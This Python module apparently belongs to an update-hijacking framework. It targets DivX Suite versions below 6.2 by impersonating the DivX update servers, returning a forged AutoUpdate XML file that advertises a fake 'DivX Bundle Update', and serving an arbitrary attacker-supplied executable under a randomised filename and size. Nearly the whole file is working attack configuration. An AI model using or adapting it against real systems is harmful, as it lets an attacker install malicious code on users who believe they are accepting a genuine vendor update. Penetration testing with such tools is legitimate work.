from modules import ModuleBase


class DivxSuite(ModuleBase):
    name = 'divxsuite'
    version = '1.0'
    appver = '< 6.2'
    author = ['Leandro Costantino < lcostantino +[AT]+ gmail.com>']
    description = """DIVX Suite ( Player, WebPlayer, Codec Converter, DrDivX""",
    vh = 'versions.divx.com|divx.com|download.divx.com' 
    requests = [
        {   'path': '/AutoUpdate/AutoUpdate\-[0-9.]+.xml',
            'type': 'file',
            'method': '',
            'bin': '0',
            'string' : "",
            'parse': '1',
            'file': './include/divxsuite/divxsuite-update.xml',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]
    options = {
        'update_engine_version': {
            'val': '1.1.1',
            'desc': ' DivX Update Engine Version'
        },
        'update_title': {
            'val': ' DivX Bundle Update',
            'desc': ' Update title '
        },
        'version': {
            'val': '10.1.1',
            'desc': 'Product Version'
        },
        'description': {
            'val' : """Upgrade to DivX 6 and experience the new DivX Player, DivX Codec and DivX
                 Converter. Experience a new level of video quality, advanced media features
                 and one-click conversion to DivX video.[br][br]
                 [a href="http://go.divx.com/divx/create/overview/en"]Read more[/a]""",
            'desc': ' Update Description'
        },
        'state': {
            'val': 'free',
            'description': ' free / pro / trial . Update app type '
        },
        'url': {
            'val' : "'http://versions.divx.com/divx/autoupdateC/' + rand_alpha(rand_num(1)) + '.exe'",
            'hidden': 1,
            'dynamic': 1,
        },
        'size': {
            'val' : " '2' + rand_num(7) ",
            'dynamic': 1
        }
    }
